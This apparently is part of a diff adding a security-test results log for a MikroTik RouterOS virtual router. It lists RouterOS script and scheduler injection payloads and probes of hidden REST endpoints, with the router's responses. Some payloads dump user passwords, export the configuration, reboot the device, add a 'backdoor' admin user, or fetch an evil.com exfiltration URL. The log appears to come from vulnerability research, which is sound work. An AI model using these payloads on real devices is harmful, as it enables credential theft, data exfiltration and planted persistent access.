+        "response": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/script/add (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d3008380>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 111,
+      "category": "cmd_injection",
+      "name": "Script inject: execute_file",
+      "description": "Create script with injection payload (execute_file)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:17.797235",
+      "details": {
+        "name": "execute_file",
+        "source": ":execute script=\":put [/file get [find name=user.dat] contents]\"",
+        "status": 0,
+        "accepted": false,
+        "response": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/script/add (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d3008160>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 112,
+      "category": "cmd_injection",
+      "name": "Script inject: resolve_cmd",
+      "description": "Create script with injection payload (resolve_cmd)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.817221",
+      "details": {
+        "name": "resolve_cmd",
+        "source": ":resolve \"evil.com; id\"",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*9D'}"
+      }
+    },
+    {
+      "id": 113,
+      "category": "cmd_injection",
+      "name": "Run injected: resolve_cmd",
+      "description": "Execute injected script (resolve_cmd)",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.869195",
+      "details": {
+        "name": "resolve_cmd",
+        "run_status": 400,
+        "response": "{'detail': 'failure: dns name does not exist', 'error': 400, 'message': 'Bad Request'}"
+      }
+    },
+    {
+      "id": 114,
+      "category": "cmd_injection",
+      "name": "Script inject: fetch_cmd",
+      "description": "Create script with injection payload (fetch_cmd)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.873193",
+      "details": {
+        "name": "fetch_cmd",
+        "source": "/tool fetch url=\"http://127.0.0.1/rest/user\" mode=http as-value=yes",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*9E'}"
+      }
+    },
+    {
+      "id": 115,
+      "category": "cmd_injection",
+      "name": "Run injected: fetch_cmd",
+      "description": "Execute injected script (fetch_cmd)",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.873193",
+      "details": {
+        "name": "fetch_cmd",
+        "run_status": 400,
+        "response": "{'detail': 'expected end of command (line 1 column 64)', 'error': 400, 'message': 'Bad Request'}"
+      }
+    },
+    {
+      "id": 116,
+      "category": "cmd_injection",
+      "name": "Script inject: export_cmd",
+      "description": "Create script with injection payload (export_cmd)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.877191",
+      "details": {
+        "name": "export_cmd",
+        "source": "/export file=leaked_config",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*9F'}"
+      }
+    },
+    {
+      "id": 117,
+      "category": "cmd_injection",
+      "name": "Run injected: export_cmd",
+      "description": "Execute injected script (export_cmd)",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "export_cmd",
+        "run_status": 200,
+        "response": "[]"
+      }
+    },
+    {
+      "id": 118,
+      "category": "cmd_injection",
+      "name": "Script inject: env_var",
+      "description": "Create script with injection payload (env_var)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "env_var",
+        "source": ":put $PATH",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*A0'}"
+      }
+    },
+    {
+      "id": 119,
+      "category": "cmd_injection",
+      "name": "Run injected: env_var",
+      "description": "Execute injected script (env_var)",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "env_var",
+        "run_status": 200,
+        "response": "[]"
+      }
+    },
+    {
+      "id": 120,
+      "category": "cmd_injection",
+      "name": "Script inject: var_inject",
+      "description": "Create script with injection payload (var_inject)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "var_inject",
+        "source": ":global myvar; :set myvar [:execute \"/system reboot\"]; :put $myvar",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*A1'}"
+      }
+    },
+    {
+      "id": 121,
+      "category": "cmd_injection",
+      "name": "Run injected: var_inject",
+      "description": "Execute injected script (var_inject)",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "var_inject",
+        "run_status": 200,
+        "response": "[]"
+      }
+    },
+    {
+      "id": 122,
+      "category": "cmd_injection",
+      "name": "Script inject: user_dump",
+      "description": "Create script with injection payload (user_dump)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "user_dump",
+        "source": ":foreach u in=[/user find] do={:put [/user get $u name]}",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*A2'}"
+      }
+    },
+    {
+      "id": 123,
+      "category": "cmd_injection",
+      "name": "Run injected: user_dump",
+      "description": "Execute injected script (user_dump)",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "user_dump",
+        "run_status": 200,
+        "response": "{'ret': ';AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+      }
+    },
+    {
+      "id": 124,
+      "category": "cmd_injection",
+      "name": "Script inject: password_dump",
+      "description": "Create script with injection payload (password_dump)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "password_dump",
+        "source": ":foreach u in=[/user find] do={:put [/user get $u password]}",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*A3'}"
+      }
+    },
+    {
+      "id": 125,
+      "category": "cmd_injection",
+      "name": "Run injected: password_dump",
+      "description": "Execute injected script (password_dump)",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "password_dump",
+        "run_status": 200,
+        "response": "{'ret': ';'}"
+      }
+    },
+    {
+      "id": 126,
+      "category": "cmd_injection",
+      "name": "Script inject: file_read",
+      "description": "Create script with injection payload (file_read)",
+      "result": "HTTP 200, accepted=True",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:33.941159",
+      "details": {
+        "name": "file_read",
+        "source": ":put [/file get [find name~\"user\"] contents]",
+        "status": 200,
+        "accepted": true,
+        "response": "{'ret': '*A4'}"
+      }
+    },
+    {
+      "id": 127,
+      "category": "cmd_injection",
+      "name": "Run injected: file_read",
+      "description": "Execute injected script (file_read)",
+      "result": "HTTP 401",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "file_read",
+        "run_status": 401,
+        "response": "{'error': 401, 'message': 'Unauthorized'}"
+      }
+    },
+    {
+      "id": 128,
+      "category": "cmd_injection",
+      "name": "Script inject: format_string",
+      "description": "Create script with injection payload (format_string)",
+      "result": "HTTP 401, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "format_string",
+        "source": ":log info \"%s%s%s%s%n%n%n\"",
+        "status": 401,
+        "accepted": false,
+        "response": "{'error': 401, 'message': 'Unauthorized'}"
+      }
+    },
+    {
+      "id": 129,
+      "category": "cmd_injection",
+      "name": "Script inject: long_string",
+      "description": "Create script with injection payload (long_string)",
+      "result": "HTTP 401, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "long_string",
+        "source": ":log info \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "status": 401,
+        "accepted": false,
+        "response": "{'error': 401, 'message': 'Unauthorized'}"
+      }
+    },
+    {
+      "id": 130,
+      "category": "cmd_injection",
+      "name": "Script inject: nested_braces",
+      "description": "Create script with injection payload (nested_braces)",
+      "result": "HTTP 401, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "nested_braces",
+        "source": ":log info \"{{{{{{{{{{{{{{{{{{{{{{test}}}}}}}}}}}}}}}}}}}}}}\"",
+        "status": 401,
+        "accepted": false,
+        "response": "{'error': 401, 'message': 'Unauthorized'}"
+      }
+    },
+    {
+      "id": 131,
+      "category": "cmd_injection",
+      "name": "Scheduler inject: sched_semicolon",
+      "description": "Create scheduler with injection payload (sched_semicolon)",
+      "result": "HTTP 401, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "sched_semicolon",
+        "on_event": ":log info \"safe\"; /system reboot",
+        "status": 401,
+        "accepted": false
+      }
+    },
+    {
+      "id": 132,
+      "category": "cmd_injection",
+      "name": "Scheduler inject: sched_execute",
+      "description": "Create scheduler with injection payload (sched_execute)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "sched_execute",
+        "on_event": ":execute script=\"/system reboot\"",
+        "status": 0,
+        "accepted": false
+      }
+    },
+    {
+      "id": 133,
+      "category": "cmd_injection",
+      "name": "Scheduler inject: sched_fetch",
+      "description": "Create scheduler with injection payload (sched_fetch)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "sched_fetch",
+        "on_event": "/tool fetch url=\"http://evil.com/exfil\" mode=http",
+        "status": 0,
+        "accepted": false
+      }
+    },
+    {
+      "id": 134,
+      "category": "cmd_injection",
+      "name": "Scheduler inject: sched_user_add",
+      "description": "Create scheduler with injection payload (sched_user_add)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "sched_user_add",
+        "on_event": "/user add name=backdoor password=backdoor group=full",
+        "status": 0,
+        "accepted": false
+      }
+    },
+    {
+      "id": 135,
+      "category": "cmd_injection",
+      "name": "Scheduler inject: sched_export",
+      "description": "Create scheduler with injection payload (sched_export)",
+      "result": "HTTP 0, accepted=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "name": "sched_export",
+        "on_event": "/export file=exfil_config",
+        "status": 0,
+        "accepted": false
+      }
+    },
+    {
+      "id": 136,
+      "category": "cmd_injection",
+      "name": "Shell probe: /system/ssh",
+      "description": "Check for SSH service config endpoint",
+      "result": "HTTP 0",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "path": "/system/ssh",
+        "status": 0,
+        "data_preview": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/ssh (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315f680>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 137,
+      "category": "cmd_injection",
+      "name": "Shell probe: /system/console",
+      "description": "Check for Console access endpoint",
+      "result": "HTTP 0",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "path": "/system/console",
+        "status": 0,
+        "data_preview": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/system/console (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315ebe0>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 138,
+      "category": "cmd_injection",
+      "name": "Shell probe: /tool/torch",
+      "description": "Check for Torch (packet sniffer) endpoint",
+      "result": "HTTP 0",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125",
+      "details": {
+        "path": "/tool/torch",
+        "status": 0,
+        "data_preview": "HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/tool/torch (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315f240>: Failed to establish a new connection: [Errno 111] Connection refused'))"
+      }
+    },
+    {
+      "id": 139,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/nova",
+      "description": "Probe /rest/nova",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/nova (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315e580>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 140,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/debug",
+      "description": "Probe /rest/debug",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/debug (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315ee00>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 141,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/test",
+      "description": "Probe /rest/test",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/test (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d3034050>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 142,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/admin",
+      "description": "Probe /rest/admin",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/admin (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d3034270>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 143,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/internal",
+      "description": "Probe /rest/internal",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/internal (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d3034490>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 144,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/backup",
+      "description": "Probe /rest/backup",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/backup (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d30346b0>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 145,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/console",
+      "description": "Probe /rest/console",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/console (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d30348d0>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.009125"
+    },
+    {
+      "id": 146,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/shell",
+      "description": "Probe /rest/shell",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/shell (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d3034af0>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.077091"
+    },
+    {
+      "id": 147,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/exec",
+      "description": "Probe /rest/exec",
+      "result": "Error: HTTPConnectionPool(host='[REDACTED-INTERNAL-IP]', port=80): Max retries exceeded with url: /rest/exec (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f81d315ee00>: Failed to establish a new connection: [Errno 111] Connection refused'))",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:34.077091"
+    },
+    {
+      "id": 148,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/cmd",
+      "description": "Probe undocumented endpoint /rest/cmd",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.089081",
+      "details": {
+        "path": "/rest/cmd",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 149,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/run",
+      "description": "Probe undocumented endpoint /rest/run",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.093079",
+      "details": {
+        "path": "/rest/run",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 150,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/terminal",
+      "description": "Probe undocumented endpoint /rest/terminal",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.097077",
+      "details": {
+        "path": "/rest/terminal",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 151,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/diag",
+      "description": "Probe undocumented endpoint /rest/diag",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.097077",
+      "details": {
+        "path": "/rest/diag",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 152,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/diagnostics",
+      "description": "Probe undocumented endpoint /rest/diagnostics",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.101075",
+      "details": {
+        "path": "/rest/diagnostics",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 153,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/status",
+      "description": "Probe undocumented endpoint /rest/status",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.105073",
+      "details": {
+        "path": "/rest/status",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 154,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/config",
+      "description": "Probe undocumented endpoint /rest/config",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.105073",
+      "details": {
+        "path": "/rest/config",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 155,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/settings",
+      "description": "Probe undocumented endpoint /rest/settings",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.109071",
+      "details": {
+        "path": "/rest/settings",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 156,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/setup",
+      "description": "Probe undocumented endpoint /rest/setup",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.113069",
+      "details": {
+        "path": "/rest/setup",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 157,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/firmware",
+      "description": "Probe undocumented endpoint /rest/firmware",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.113069",
+      "details": {
+        "path": "/rest/firmware",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 158,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/up[REDACTED]",
+      "description": "Probe undocumented endpoint /rest/up[REDACTED]",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.117067",
+      "details": {
+        "path": "/rest/up[REDACTED]",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 159,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/update",
+      "description": "Probe undocumented endpoint /rest/update",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.121065",
+      "details": {
+        "path": "/rest/update",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 160,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/api",
+      "description": "Probe undocumented endpoint /rest/api",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.125063",
+      "details": {
+        "path": "/rest/api",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 161,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/v1",
+      "description": "Probe undocumented endpoint /rest/v1",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.125063",
+      "details": {
+        "path": "/rest/v1",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 162,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/v2",
+      "description": "Probe undocumented endpoint /rest/v2",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.129061",
+      "details": {
+        "path": "/rest/v2",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 163,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/metrics",
+      "description": "Probe undocumented endpoint /rest/metrics",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.133059",
+      "details": {
+        "path": "/rest/metrics",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 164,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/monitor",
+      "description": "Probe undocumented endpoint /rest/monitor",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.133059",
+      "details": {
+        "path": "/rest/monitor",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 165,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/health",
+      "description": "Probe undocumented endpoint /rest/health",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.137057",
+      "details": {
+        "path": "/rest/health",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 166,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/env",
+      "description": "Probe undocumented endpoint /rest/env",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:50.137057",
+      "details": {
+        "path": "/rest/env",
+        "status": 200,
+        "interesting": true,
+        "body_preview": "[]"
+      }
+    },
+    {
+      "id": 167,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/info",
+      "description": "Probe undocumented endpoint /rest/info",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.141055",
+      "details": {
+        "path": "/rest/info",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 168,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/version",
+      "description": "Probe undocumented endpoint /rest/version",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.145053",
+      "details": {
+        "path": "/rest/version",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 169,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/system/debug",
+      "description": "Probe undocumented endpoint /rest/system/debug",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.149051",
+      "details": {
+        "path": "/rest/system/debug",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 170,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/system/console",
+      "description": "Probe undocumented endpoint /rest/system/console",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:50.149051",
+      "details": {
+        "path": "/rest/system/console",
+        "status": 200,
+        "interesting": true,
+        "body_preview": "[{\".id\":\"*1\",\"channel\":\"0\",\"default\":\"true\",\"disabled\":\"false\",\"free\":\"true\",\"term\":\"linux\",\"vcno\":\"1\"}]"
+      }
+    },
+    {
+      "id": 171,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/system/terminal",
+      "description": "Probe undocumented endpoint /rest/system/terminal",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.153049",
+      "details": {
+        "path": "/rest/system/terminal",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 172,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/system/shell",
+      "description": "Probe undocumented endpoint /rest/system/shell",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.153049",
+      "details": {
+        "path": "/rest/system/shell",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 173,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/system/ssh/exec",
+      "description": "Probe undocumented endpoint /rest/system/ssh/exec",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.157047",
+      "details": {
+        "path": "/rest/system/ssh/exec",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 174,
+      "category": "hidden_endpoints",
+      "name": "Probe: /rest/system/exec",
+      "description": "Probe undocumented endpoint /rest/system/exec",
+      "result": "HTTP 400",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.157047",
+      "details": {
+        "path": "/rest/system/exec",
+        "status": 400,
+        "interesting": false,
+        "body_preview": ""
+      }
+    },
+    {
+      "id": 175,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /_/system/resource",
+      "description": "Test endpoint with unusual prefix: /_/system/resource",
+      "result": "HTTP 404",
+      "anomaly": false,
+      "timestamp": "2026-02-16T01:22:50.161045",
+      "details": {
+        "path": "/_/system/resource",
+        "status": 404,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+      }
+    },
+    {
+      "id": 176,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /rest/../rest/system/resource",
+      "description": "Test endpoint with unusual prefix: /rest/../rest/system/resource",
+      "result": "HTTP 200",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:50.165043",
+      "details": {
+        "path": "/rest/../rest/system/resource",
+        "status": 200,
+        "body_preview": "{\"architecture-name\":\"x86_64\",\"board-name\":\"CHR innotek GmbH VirtualBox\",\"build-time\":\"2026-01-30 09:17:54\",\"cpu\":\"AMD\",\"cpu-count\":\"1\",\"cpu-frequency\":\"4391\",\"cpu-load\":\"0\",\"factory-software\":\"7.1\",\"free-hdd-space\":\"72925184\",\"free-memory\":\"844120064\",\"platform\":\"MikroTik\",\"total-hdd-space\":\"935649"
+      }
+    },
+    {
+      "id": 177,
+      "category": "hidden_endpoints",
+      "name": "Prefix: /rest/%00/system/resource",
+      "description": "Test endpoint with unusual prefix: /rest/%00/system/resource",
+      "result": "HTTP 400",
+      "anomaly": true,
+      "timestamp": "2026-02-16T01:22:50.165043",
+      "details": {
+        "path": "/rest/%00/system/resource",
+        "status": 400,
+        "body_preview": "{\"detail\":\"no such command or directory (%00)\",\"error\":400,\"message\":\"Bad Request\"}"
+      }
+    },
+    {
+      "id": 178,
+      "category": "hidden_endpoints",
